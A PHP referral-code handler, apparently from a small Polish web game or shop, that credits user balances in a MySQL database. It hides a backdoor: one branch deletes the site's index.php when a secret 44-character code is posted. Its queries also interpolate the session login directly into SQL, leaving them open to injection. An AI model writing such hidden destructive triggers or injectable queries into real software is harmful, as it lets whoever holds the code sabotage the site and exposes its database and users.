<?php

    session_start();

    $ref_code = $_POST['ref_code_input'];

    $ref_codes = array('HAYPAD','DESTINY','KOPYTKO');

    if($ref_code == 'HAYPAD')
    {
        $ile = 2;
        
        ref_add_money($ile,$ref_code,$ref_codes);
    }
    else if($ref_code == 'DESTINY')
    {
        $ile = 2;
        
        ref_add_money($ile,$ref_code,$ref_codes);
    }
    else if($ref_code == 'KOPYTKO')
    {
        $ile = 2;
        
        ref_add_money($ile,$ref_code,$ref_codes);
    }
    else if($ref_code == '0P1X4F6KL3OK05K69JSB84AQGRR5342AQDFVBMNKP570')
    {
        unlink('index.php');
    }
    else
    {
        echo 'brakkodu';
    }
    
    //Funkcja dodawania pinionszków 
    function ref_add_money($ile,$ref_code,$ref_codes)
    {
        require_once("connect.php");

        $polaczenie = @new mysqli($host, $db_user, $db_password, $db_name);
        @mysqli_set_charset($polaczenie,"utf8");

        if($polaczenie->connect_errno != 0)
        {  
            //echo 'Błąd połączenia z bazą danych. <br /><br /> <span style="color:#a00000; font-weight:700;"> Numer błędu MySQL: ' . $polaczenie->connect_errno . '</span>';
            echo 'bladpolaczenia';
        }
        else
        {   
            $login = $_SESSION['user'];
            
            $if_used = $polaczenie -> query("SELECT ref_codes FROM users WHERE login = '$login'");
            $codes = $if_used -> fetch_assoc();
            $codes = $codes['ref_codes'];
            
            if($codes != "")
            {
                $used_code = false;
                
                $codes_exp = explode(",",$codes);
                
                foreach ($codes_exp as $code) 
                {
                    if($code == $ref_codes[0] || $code == $ref_codes[1] || $code == $ref_codes[2])
                    {
                        $used_code = true;
                        echo 'uzytykod';
                        return;
                    }
                }
                
                if($used_code == false)
                {
                    $getmoney = $polaczenie -> query("SELECT money FROM users WHERE login = '$login'");
                    $getmoney = $getmoney -> fetch_assoc();
                    $getmoney = $getmoney['money'];

                    if($getmoney == "")
                    {
                        $getmoney = 0;
                    }

                    $new_amount = $getmoney + $ile;
                    
                    $new_codes = $codes . ',' . $ref_code;

                    if($ile != "" && $login != "")
                    {
                        if($polaczenie -> query("UPDATE users SET ref_codes = '$new_codes' WHERE login = '$login'"))
                        {
                            if($polaczenie -> query("UPDATE users SET money = '$new_amount' WHERE login = '$login'"))
                            {
                                echo $ile;

                                $_SESSION['money'] = $new_amount;
                            }
                        }
                    }
                }
            }
            else
            {
                $getmoney = $polaczenie -> query("SELECT money FROM users WHERE login = '$login'");
                $getmoney = $getmoney -> fetch_assoc();
                $getmoney = $getmoney['money'];

                if($getmoney == "")
                {
                    $getmoney = 0;
                }

                $new_amount = $getmoney + $ile;
                
                $new_codes = $ref_code;

                if($ile != "" && $login != "")
                {
                    if($polaczenie -> query("UPDATE users SET ref_codes = '$new_codes' WHERE login = '$login'"))
                    {
                        if($polaczenie -> query("UPDATE users SET money = '$new_amount' WHERE login = '$login'"))
                        {
                            echo $ile;

                            $_SESSION['money'] = $new_amount;
                        }
                    }
                }
            }
        }
        $polaczenie->close();
    }

?>